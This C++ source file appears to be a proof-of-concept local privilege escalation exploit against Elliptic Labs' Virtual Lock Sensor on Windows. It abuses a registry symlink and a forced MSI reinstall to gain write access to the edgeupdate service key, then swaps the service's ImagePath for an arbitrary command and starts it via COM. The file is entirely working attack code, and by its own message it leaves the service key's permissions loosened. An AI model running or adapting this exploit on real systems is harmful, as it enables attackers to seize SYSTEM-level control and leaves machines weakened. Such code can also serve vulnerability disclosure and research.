#pragma comment(lib, "Msi.lib")

#include <Windows.h>
#include <Msi.h>
#include <sddl.h>

#include <wil/com.h>
#include <string>  // Has to be included before "wil/registry.h"
#include <wil/registry.h>
#include <wil/resource.h>
#include <wil/result.h>

#include <exception>
#include <format>
#include <iostream>

import offwinlib;

using namespace std::string_literals;

int wmain(int argc, wchar_t* argv[])
{
	try
	{
		if (argc < 2)
		{
			std::wcout << L"Usage: VirtualLockSensorLPE.exe COMMAND" << std::endl;
			return 1;
		}
		const auto& payload = argv[1];

		// Create subkey
		auto subkey_path = LR"(SOFTWARE\Elliptic Labs\Virtual Lock Sensor\UserSettings\PluggedIn\a)"s;
		std::wcout << std::format(LR"([*] Creating subkey "HKLM\{}" with "Full Control" to "Everyone" and "Container Inheritance" enabled...)", subkey_path) << std::endl;
		wil::unique_hlocal_security_descriptor sd;
		THROW_IF_WIN32_BOOL_FALSE(ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;CI;GA;;;WD)", SDDL_REVISION_1, &sd, nullptr));
		SECURITY_ATTRIBUTES sec_att
		{
			.nLength = sizeof(SECURITY_ATTRIBUTES),
			.lpSecurityDescriptor = sd.get(),
			.bInheritHandle = false
		};
		wil::unique_hkey key;
		THROW_IF_WIN32_ERROR(RegCreateKeyExW(HKEY_LOCAL_MACHINE, subkey_path.c_str(), 0, NULL, 0, KEY_WRITE, &sec_att, &key, nullptr));
		std::wcout << L"[+] Subkey created." << std::endl;

		// Create registry link to "edgeupdate" service configuration
		auto link_path = LR"(SOFTWARE\Elliptic Labs\Virtual Lock Sensor\UserSettings\PluggedIn\a\b)"s;
		auto link_target = LR"(SYSTEM\CurrentControlSet\Services\edgeupdate)"s;
		auto link_path_nt = LR"(\Registry\Machine\)" + link_path;
		std::wcout << std::format(LR"([*] Creating registry link from "HKLM\{}" to "HKLM\{}"...)", link_path, link_target) << std::endl;
		owl::registry::create_registry_symlink_nt(link_path_nt, LR"(\Registry\Machine\)" + link_target);
		std::wcout << L"[+] Link created." << std::endl;

		// Force a reinstall of Virtual Lock Sensor
		auto product_id = L"{3EC71C48-7F11-4303-912F-6B52762B8258}";
		std::wcout << std::format(LR"([*] Forcing reinstall of "Virtual Lock Sensor" with product ID: {}...)", product_id) << std::endl;
		MsiSetInternalUI(INSTALLUILEVEL_NONE, nullptr);
		THROW_IF_WIN32_ERROR(MsiReinstallProductW(product_id, REINSTALLMODE_MACHINEDATA));
		std::wcout << L"[+] Reinstall completed." << std::endl;

		// Delete registry link
		std::wcout << L"[*] Deleting registry link..." << std::endl;
		owl::registry::delete_registry_symlink_nt(link_path_nt);
		std::wcout << L"[+] Link deleted." << std::endl;

		// Delete subkey
		std::wcout << L"[*] Deleting subkey..." << std::endl;
		THROW_IF_WIN32_ERROR(RegDeleteKeyW(key.get(), L""));
		std::wcout << L"[+] Subkey deleted." << std::endl;

		// Modify "edgeupdate" service via registry
		std::wcout << std::format(LR"([*] Configuring "edgeupdate" service via registry to execute "{}"...)", payload) << std::endl;
		auto service_key = wil::reg::open_unique_key(HKEY_LOCAL_MACHINE, link_target.c_str(), wil::reg::key_access::readwrite);
		auto current_service_path = wil::reg::get_value_string(service_key.get(), L"ImagePath");
		wil::reg::set_value_string(service_key.get(), L"ImagePath", payload);
		std::wcout << L"[+] Service configured." << std::endl;

		// Start "edgeupdate" service via COM
		auto clsid_string = L"{EA92A799-267E-4DF5-A6ED-6A7E0684BB8A}";
		std::wcout << std::format(LR"([*] Starting "edgeupdate" via COM class {} to execute payload...)", clsid_string) << std::endl;
		auto com = wil::CoInitializeEx();
		CLSID clsid;
		THROW_IF_FAILED(CLSIDFromString(clsid_string, &clsid));
		try
		{
			wil::CoCreateInstance(clsid, CLSCTX_LOCAL_SERVER);
		}
		catch (const wil::ResultException& e)
		{
			if (e.GetErrorCode() != HRESULT_FROM_WIN32(ERROR_SERVICE_REQUEST_TIMEOUT))  // We expect a timeout
			{
				throw;
			}
		}
		std::wcout << L"[+] COM class instantiated." << std::endl;

		// Reset "edgeupdate" service configuration
		std::wcout << LR"([*] Resetting "edgeupdate" service configuration...)" << std::endl;
		wil::reg::set_value(service_key.get(), L"ImagePath", current_service_path.c_str());
		std::wcout << L"[+] Service reset." << std::endl;

		std::wcout << LR"([!] Permissions on the "edgeupdate" service registry key haven't been reset!)" << std::endl;
	}
	catch (const std::exception& e)
	{
		std::wcout << L"[-] " << e.what() << std::endl;
		return 1;
	}

	return 0;
}
